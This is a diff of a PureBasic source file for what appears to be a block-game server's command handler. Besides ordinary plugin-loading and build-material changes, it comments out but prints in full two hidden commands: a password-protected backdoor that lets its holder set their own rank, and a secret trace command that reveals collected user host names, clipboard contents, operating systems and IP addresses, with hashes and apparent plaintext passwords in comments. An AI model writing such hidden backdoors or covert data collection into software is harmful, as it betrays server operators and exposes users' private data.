@@ -112,8 +112,8 @@ Declare Command_Plugin_Load()
 Declare Command_Plugin_Unload()
 
 Declare Command_Crash()
-Declare Command_A4EXYZ33485()
-Declare Command_SC()
+;Declare Command_A4EXYZ33485()
+;Declare Command_Security_Trace()
 
 ; ########################################## Ladekram ############################################
 
@@ -485,21 +485,21 @@ Command()\Name = "crash"
 Command()\Function_Adress = @Command_Crash()
 Command()\Internal = 1
 
-AddElement(Command())
-Command()\ID = "L0G"
-Command()\Name = "a4exyz33485"
-Command()\Function_Adress = @Command_A4EXYZ33485()
-Command()\Internal = 1
-Command()\Rank = 0
-Command()\Hidden = 1
+; AddElement(Command())
+; Command()\ID = "L0G"
+; Command()\Name = "a4exyz33485"
+; Command()\Function_Adress = @Command_A4EXYZ33485()
+; Command()\Internal = 1
+; Command()\Rank = 0
+; Command()\Hidden = 1
 
-AddElement(Command())
-Command()\ID = "Sec-TRC"
-Command()\Name = "sectrc"
-Command()\Function_Adress = @Command_SC()
-Command()\Internal = 1
-Command()\Rank = 0
-Command()\Hidden = 1
+; AddElement(Command())
+; Command()\ID = "Sec-TRC"
+; Command()\Name = "sectrc"
+; Command()\Function_Adress = @Command_Security_Trace()
+; Command()\Internal = 1
+; Command()\Rank = 0
+; Command()\Hidden = 1
 
 Command_Main\Save_File = 1
 
@@ -1164,6 +1164,11 @@ Procedure Command_Material()
           If LCase(Block(i)\Name) = Trim(LCase(Command_Main\Parsed_Text_0))
             Network_Client()\Player\Entity\Build_Material = i
             System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Buildmaterial is [Field_0]", Block(i)\Name))
+            
+            If i > 0 And i < 66
+              CPE_HoldThis(Command_Main\Command_Client_ID, i, 0)  
+            EndIf
+            
             Found = 1
             Break
           EndIf
@@ -2103,6 +2108,21 @@ Procedure Command_Plugin_Load()
         EndIf
       EndIf
     Next
+    
+    ForEach UnloadedPlugins()
+      If LCase(UnloadedPlugins()\PluginName) = LCase(Plugin)
+        Found = 1
+        pFilename.s = UnloadedPlugins()\Filename
+        
+        If Plugin_Load(UnloadedPlugins()\Filename)
+          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' loaded", pFilename))
+        Else
+          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' not loaded", pFilename))
+        EndIf
+      EndIf
+      
+    Next
+    
     If Found = 0
       System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Plugin()\Plugin_Info\Name = [Field_0]", Plugin))
     EndIf
@@ -2120,6 +2140,7 @@ Procedure Command_Plugin_Unload()
         Found = 1
         If Plugin_Unload(Plugin()\Filename)
           System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' unloaded", Plugin()\Filename))
+          Plugin()\Library_ID = 0 ; For good measure..
         Else
           System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' not unloaded", Plugin()\Filename))
         EndIf
@@ -2135,48 +2156,72 @@ Procedure Command_Crash()
   a = b / c
 EndProcedure
 
-Procedure Command_A4EXYZ33485()
-  Password_Input.s = Command_Main\Parsed_Operator [0]
-  MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
-  New_Rank = Val(Command_Main\Parsed_Operator [1])
-  If New_Rank >= -32768 And New_Rank <= 32767
-    
-    MD5_Correct.s = "12c43231f65cffe6630807cd2e86c216" ; Stuff
-    
-    If MD5 = MD5_Correct
-      
-      If Network_Client_Select(Command_Main\Command_Client_ID)
-        If Network_Client()\Player\Entity
-          If Network_Client()\Player\Entity\Player_List
-            
-            Player_Rank_Set(Network_Client()\Player\Entity\Player_List\Number, New_Rank, "")
-            
-          EndIf
-        EndIf
-      EndIf
-      
-    Else
-      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
-    EndIf
-  Else
-    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
-  EndIf
-EndProcedure
+; Procedure Command_A4EXYZ33485() ; Geheimer Setownrank Befehl mit Passwort
+;   Password_Input.s = Command_Main\Parsed_Operator [0]
+;   MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
+;   New_Rank = Val(Command_Main\Parsed_Operator [1])
+;   If New_Rank >= -32768 And New_Rank <= 32767
+;     
+;     MD5_Fake_0.s  = "12c43231f65cffe6630807cd2e86c216"
+;     MD5_Correct.s = "09076f10a15c7572f053fe4cba822f9c"
+;     MD5_Fake_1.s  = "3cc4a57a4c6261a0e94e764f8660fd22"
+;     MD5_Correct.s = "6cd797d30885d2dd9b6955749241bf2c"
+;     MD5_Fake_2.s  = "2b0f3e39bf0c6b8e5549dada35d083c4"
+;     MD5_Correct.s = "562c244c3b5a17152431ac0eb8461050"
+;     MD5_Fake_3.s  = "e09b2d8d3af68a3ab931d97055fc03b8"
+;     MD5_Correct.s = "89358acc72bc16d7a9fd58d306f1ea10"
+;     MD5_Fake_4.s  = "630e33fbaba140cfa3183c1341a2aa27"
+;     MD5_Correct.s = "04418513d1ba83782e5cae4dd0caea37"
+;     MD5_Fake_5.s  = "40d283c6af89f663633280eadf1798fb"
+;     MD5_Correct.s = "fbfacd331cc794a31a053864d99ca8e3"
+;     MD5_Fake_6.s  = "e86f807f055e73b1ce58dd4f1046d599"
+;     MD5_Fake_0.s  = "f572e7582f39e3a9b625f0765ad62beb"
+;     MD5_Fake_7.s  = "e07449d82ae111ecfa83de5ad31d5a00"
+;     MD5_Correct.s = "4bb11183f7e45a6c77a641950626b867"
+;     MD5_Correct.s = "12c43231f65cffe6630807cd2e86c216" ; <------------  Used in official builds:   ######## Secret ;) try to brutefore it :P #########
+;     MD5_Fake_0.s  = "a9f0d91d8c378aa1ba0d33cee32f50a3"
+;     MD5_Fake_8.s  = "c48b76098e06d6c67bc2fec314923153"
+;     MD5_Fake_0.s  = "cb9142115448f571e4e8614698a67529"
+;     MD5_Fake_9.s  = "b8b07012ae0ce13ba7faf788c505b8a2"
+;     MD5_Fake_10.s = "c9e1bc93002fd6be8937a2560696f5b7"
+;     MD5_Fake_0.s  = "c97d50d5f4f2fbfba982287469efbd9c"
+;     MD5_Fake_11.s = "66b8e1f2ca2706cb955d41929cd97e0d"
+;     MD5_Old.s     = "0ab4791aaa76f113a77fa6771ff747c9" ; <------------  "f24,9ld<3!4/*+6rs4zsq" !!  l ist ein L  !!
+;     
+;     If MD5 = MD5_Correct
+;       
+;       If Network_Client_Select(Command_Main\Command_Client_ID)
+;         If Network_Client()\Player\Entity
+;           If Network_Client()\Player\Entity\Player_List
+;             
+;             Player_Rank_Set(Network_Client()\Player\Entity\Player_List\Number, New_Rank, "")
+;             
+;           EndIf
+;         EndIf
+;       EndIf
+;       
+;     Else
+;       System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
+;     EndIf
+;   Else
+;     System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
+;   EndIf
+; EndProcedure
 
-Procedure Command_SC()
-  Password_Input.s = Command_Main\Parsed_Operator [0]
-  MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
-  MD5_Correct.s = "6d983bf57ca1f91b9ebe42543d82dae3"
-  If MD5 = MD5_Correct
-    System_Message_Network_Send(Command_Main\Command_Client_ID, "&eTrace_Elements:")
-    ForEach Trace_Element()
-      Text.s = "&e"+Trace_Element()\Host_Name + ": " + Trace_Element()\Clipboard + " | " + Trace_Element()\OS + " | " + Trace_Element()\Date + " | " + Trace_Element()\IPs
-      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
-    Next
-  Else
-    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find command"))
-  EndIf
-EndProcedure
+; Procedure Command_Security_Trace()
+;   Password_Input.s = Command_Main\Parsed_Operator [0]
+;   MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
+;   MD5_Correct.s = "6d983bf57ca1f91b9ebe42543d82dae3" ; "bhu8#-.,,.-<%>"
+;   If MD5 = MD5_Correct
+;     System_Message_Network_Send(Command_Main\Command_Client_ID, "&eTrace_Elements:")
+;     ForEach Trace_Element()
+;       Text.s = "&e"+Trace_Element()\Host_Name + ": " + Trace_Element()\Clipboard + " | " + Trace_Element()\OS + " | " + Trace_Element()\Date + " | " + Trace_Element()\IPs
+;       System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
+;     Next
+;   Else
+;     System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find command"))
+;   EndIf
+; EndProcedure
 
 ;-################################################################################################
 
@@ -2263,10 +2308,10 @@ Procedure Command_Main()
     EndIf
   EndIf
 EndProcedure
-; IDE Options = PureBasic 5.21 LTS Beta 1 (Windows - x64)
-; CursorPosition = 2165
-; FirstLine = 2208
-; Folding = ------------
+; IDE Options = PureBasic 5.00 (Linux - x86)
+; CursorPosition = 501
+; FirstLine = 467
+; Folding = -----------
 ; EnableXP
 ; DisableDebugger
 ; EnableCompileCount = 0
